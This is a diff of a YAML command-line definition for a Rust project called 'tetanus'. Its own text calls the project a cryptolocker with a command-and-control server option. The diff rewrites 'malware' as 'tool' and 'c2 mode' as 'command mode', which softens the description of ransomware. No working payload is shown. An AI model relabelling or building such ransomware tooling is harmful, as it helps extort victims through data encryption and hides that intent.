@@ -1,7 +1,7 @@
 name: tetanus
 version: "0.1.0"
 author: Jason Ross <algorythm@gmail.com>
-about: A simple cryptolocker malware written in Rust
+about: A simple cryptolocker tool written in Rust
 args:
     - c2:
         help: sets the command and control server host
@@ -10,7 +10,7 @@ args:
         index: 1
 subcommands:
     - nail:
-        about: runs tetanus in c2 mode
+        about: runs tetanus in command mode
         args:
             - port:
                 short: p
